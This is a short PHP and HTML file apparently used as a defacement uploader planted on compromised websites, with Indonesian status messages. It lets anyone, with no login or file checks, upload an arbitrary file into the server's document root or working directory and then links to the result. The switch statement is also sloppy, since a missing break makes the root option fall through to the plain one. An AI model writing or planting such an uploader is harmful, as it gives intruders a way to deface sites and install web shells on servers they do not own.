<div class="center"><form method="post" enctype="multipart/form-data">

    <input type="radio" name="tipe" value="root">Home root<input type="radio" name="tipe" value="biasa">Biasa <br><br>
   choose your file:&nbsp;&nbsp&nbsp;<input type="file" name= "idx_file">
      <input type="submit" name="upload" value="upload">
      </form>
<?php
if(isset($_POST['upload'])) {
    switch($_POST['tipe']){
        case "root":
            $root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Ciee Sukses Uploadnya :* -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload root >:(";
		}
	} else {
		echo "<font color='red'>klo ga bisa silahkan pakai yang biasa :)</font>";
		} 

     case "biasa":
         $files = $_FILES['idx_file']['name'];

if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
    $web = "http://".$_SERVER['HTTP_HOST']."/";
    echo "Sukses Upload => <a href='".$web.$files."' target='_blank>".$web.$files."</a>";
		} else {
			echo "<script> alert('gagal upload >:(');</script>";
		}
		break;
        default: echo "<script>alert('Harap pilih opsi');</script>"; break;
} 
}
echo "</div>";
?>
